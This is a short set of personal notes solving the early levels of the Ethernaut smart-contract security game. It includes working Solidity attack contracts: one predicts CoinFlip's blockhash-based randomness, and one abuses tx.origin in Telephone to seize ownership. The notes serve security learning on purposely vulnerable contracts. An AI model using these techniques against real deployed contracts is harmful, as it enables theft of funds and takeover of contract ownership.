# Ethernaut Notes
Notes on [Ethernaut](https://ethernaut.openzeppelin.com) exercises.

# 00. Ethernaut 
* Just go through the console.
* Check out all the ABIs. 
* Password will be shown in a function. 

# 01. FallBack
* Getting the various RPC functions like the one to send Transaction. 
* Finding the diffrence between receive and fallback functions in solidity. 
* Sending ether to contract thus changing the owner to msg.sender.

# 02. Fallout
* Read the code.
* Just Calling Fal1out function will make us the owner. 

# 03. Coinflip
* Generating randomness inside a contract using globally available values or Hardcoded values is a Big NO.
* Everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private.
* Using an another contract attacker can hack that randomness.
* Here using Remix IDE we can call that contract inside an malicious contract using the same function we can crack the randomness. 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract CoinFlipAttack {

  CoinFlip public victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimAddress) {
    victim = CoinFlip(_victimAddress);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    victim.flip(side);
    }  
}
```
# 04. Telephone 
* ```tx.origin``` and ```msg.sender``` Shows same value only if EOA (Externally owned address) is used to call.
* By using another Smart contract to call the function we can take advantage of this contract because Smart contracts are not EOA so ```tx.origin``` changes.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TeleAttack {
    Telephone  tele;

    constructor(address _tele) {
        tele = Telephone(_tele);
    }

    function Attack(address _owner) public{
        tele.changeOwner(_owner);
    }
} 
```  

 
